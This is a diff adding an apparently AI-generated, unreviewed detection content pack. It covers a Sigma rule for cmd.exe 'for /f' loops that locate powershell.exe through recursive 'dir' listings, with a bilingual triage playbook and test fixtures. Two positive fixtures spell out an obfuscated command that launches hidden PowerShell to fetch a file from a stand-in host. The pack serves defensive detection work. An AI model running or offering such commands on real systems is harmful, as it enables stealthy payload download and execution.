@@ -1,0 +1,127 @@
+{
+  "rule": {
+    "id": "2782fbd8-b662-4eb5-9962-5bfbfb671e7b",
+    "title": "Suspicious Usage of For Loop with Recursive Directory Search in CMD",
+    "level": "medium",
+    "status": "experimental",
+    "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+    "path": "windows/process_creation/proc_creation_win_susp_cmd_for_loop_execution_with_recursive_directory_search.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_cmd_for_loop_execution_with_recursive_directory_search.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027.010",
+      "T1059.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó cmd.exe con un bucle 'for /f' con 'tokens=' sobre la salida de un 'dir', en el propio proceso o en su proceso padre. Esto puede indicar que se busca un binario del sistema, como powershell.exe, para ejecutarlo sin escribir su nombre de forma explícita.",
+      "what_it_detects": "Procesos cuyo CommandLine o ParentCommandLine contiene a la vez 'for /f', 'tokens=', 'in (' y 'dir'. Es decir, un bucle de cmd que recorre un listado de directorios, normalmente recursivo (dir /s /b), y ejecuta lo que encuentra. Este patrón se ha visto en archivos LNK maliciosos.",
+      "why_it_matters": "Los atacantes usan el intérprete de comandos de Windows (T1059.003) y ofuscan la línea de comandos (T1027.010) para que las detecciones basadas en nombres como 'powershell.exe' no vean el binario. Este comportamiento suele ser la primera etapa tras abrir un LNK o un adjunto, y puede descargar o ejecutar un payload.",
+      "triage_steps": [
+        "Revise el CommandLine o ParentCommandLine completo: qué directorio se lista, qué patrón de búsqueda usa (por ejemplo *shell.exe) y qué se ejecuta después del 'do'.",
+        "Identifique el ParentImage. Si es explorer.exe y viene de un LNK, revise la ruta del acceso directo: Descargas, Temp, una unidad montada (ISO) o un adjunto.",
+        "Busque los procesos hijos del cmd.exe, en especial powershell.exe, mshta.exe o rundll32.exe, y analice sus argumentos (-w hidden, -nop, -enc).",
+        "En el mismo host, revise la actividad de red, DNS y escritura de archivos en un rango de +/- 15 minutos para detectar descargas o persistencia.",
+        "Valide si el usuario abrió recientemente un correo, un archivo comprimido o una imagen ISO, y obtenga el hash del LNK o del archivo de origen.",
+        "Busque alertas previas de este host y este usuario, y la misma línea de comandos en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de instalación legítimos que localizan un ejecutable con 'for /f' y 'dir /s /b' antes de llamarlo.",
+        "Herramientas internas de inventario o de compilación que recorren directorios y procesan la salida con tokens."
+      ],
+      "response_steps": [
+        "Verifique con el usuario y con el equipo responsable si el script es conocido. Si no lo es, trate la alerta como una posible intrusión.",
+        "Si se confirma actividad maliciosa, aísle el endpoint y termine los procesos hijos sospechosos tras preservar la evidencia (memoria y archivos).",
+        "Recolecte el LNK, los payloads descargados y sus hashes. Bloquee los dominios e IPs relacionados.",
+        "Elimine la persistencia identificada, restablezca las credenciales del usuario si hubo exposición y busque los mismos indicadores en el resto del entorno."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque el patrón es poco habitual y está ligado a LNK maliciosos, aunque algunos scripts legítimos pueden usarlo y se requiere contexto para confirmar el riesgo."
+    },
+    "en": {
+      "summary": "cmd.exe ran a 'for /f' loop with 'tokens=' over 'dir' output, either in the process itself or in its parent. This may mean a system binary such as powershell.exe was located and launched without naming it directly.",
+      "what_it_detects": "Processes whose CommandLine or ParentCommandLine contains all of 'for /f', 'tokens=', 'in (' and 'dir'. That is a cmd loop that walks a directory listing, usually recursive (dir /s /b), and runs whatever it finds. This pattern has been seen in malicious LNK files.",
+      "why_it_matters": "Attackers use the Windows command shell (T1059.003) and obfuscate the command line (T1027.010) so that detections keyed on names like 'powershell.exe' miss the binary. This is often the first stage after a user opens an LNK file or attachment, and it can download or run a payload.",
+      "triage_steps": [
+        "Read the full CommandLine or ParentCommandLine: which directory is listed, which search pattern is used (for example *shell.exe) and what runs after 'do'.",
+        "Identify the ParentImage. If it is explorer.exe launching an LNK file, check where the shortcut lives: Downloads, Temp, a mounted ISO or an email attachment.",
+        "List the child processes of cmd.exe, especially powershell.exe, mshta.exe or rundll32.exe, and review their arguments (-w hidden, -nop, -enc).",
+        "On the same host, review network, DNS and file-write activity within +/- 15 minutes for downloads or persistence.",
+        "Check whether the user recently opened an email, an archive or an ISO image, and get the hash of the LNK file or source file.",
+        "Search for earlier alerts on this host and user, and for the same command line on other endpoints."
+      ],
+      "false_positives": [
+        "Legitimate admin or installer scripts that locate an executable with 'for /f' and 'dir /s /b' before calling it.",
+        "Internal inventory or build tools that walk directories and parse the output with tokens."
+      ],
+      "response_steps": [
+        "Ask the user and the owning team whether the script is known. If nobody recognizes it, treat the alert as a possible intrusion.",
+        "If malicious activity is confirmed, isolate the endpoint and kill the suspicious child processes, but preserve memory and files first.",
+        "Collect the LNK file, any downloaded payloads and their hashes. Block the related domains and IPs.",
+        "Remove any persistence you find, reset the user's credentials if they were exposed and hunt for the same indicators across the environment."
+      ],
+      "severity_rationale": "Medium fits because the pattern is uncommon and tied to malicious LNK files, but some legitimate scripts use it, so context is needed to confirm the risk."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "LNK-launched cmd.exe locates powershell.exe through a recursive dir inside a for /f loop",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\Windows\\System32\\cmd.exe /c for /f \"tokens=*\" %i in ('dir /b /s C:\\Windows\\System32\\*shell.exe') do %i -w hidden -nop -c \"iwr https://example.com/a.txt\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      },
+      {
+        "description": "powershell.exe child whose parent cmd.exe command line contains the for /f dir loop",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -nop -c \"iwr https://example.com/a.txt\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c for /f \"tokens=*\" %i in ('dir /b /s C:\\Windows\\System32\\*shell.exe') do %i -w hidden -nop -c \"iwr https://example.com/a.txt\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin batch loop parses a CSV with for /f and tokens but does not list any directory",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin.ops",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\Windows\\System32\\cmd.exe /c for /f \"tokens=1,2 delims=,\" %a in (C:\\Scripts\\users.csv) do echo %a",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c C:\\Scripts\\report.bat"
+        }
+      },
+      {
+        "description": "Plain recursive dir listing without a for /f loop",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\Windows\\System32\\cmd.exe /c dir /s /b C:\\Projects\\*.log > C:\\Temp\\logs.txt",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
